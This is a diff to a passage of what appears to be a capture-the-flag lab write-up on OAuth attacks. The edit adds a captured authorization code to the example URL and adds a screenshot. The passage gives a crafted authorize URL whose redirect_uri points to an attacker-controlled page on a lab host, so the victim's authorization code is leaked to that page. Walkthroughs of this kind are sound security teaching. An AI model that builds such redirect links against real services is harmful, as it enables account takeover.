@@ -157,4 +157,7 @@ Like mentioned above, these tokens are issued by the authorization server and re
 When the victims click "Login via OAuth" button, the victims are navigate to the **`CoffeeShopApp`** to authenticate. However, if we inspect the URL, we see the `redirected_uri` is pointing to the domain that the attackers have control: `malicious_redirect.html`.
 `http://coffee.thm:8000/accounts/login/?next=/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&response_type=code&redirect_uri=http://dev.bistro.thm:8002/malicious_redirect.html`
 
-After the victim successfully authenticate, the authorization code will be sent to the `http://dev.bistro.thm:8002/malicious_redirect.html` page instead of the regular `http://bistro.thm:8000/` page.
+After the victim successfully authenticate, the authorization code will be sent to the `http://dev.bistro.thm:8002/malicious_redirect.html?code=6cJDKI4CAxPqmOzscmRxZxG7jCuRcH` page instead of the regular `http://bistro.thm:8000/` page.
+
+![image](https://github.com/user-attachments/assets/8e3cd6c5-7336-4659-8eba-0d14338396d4)
+
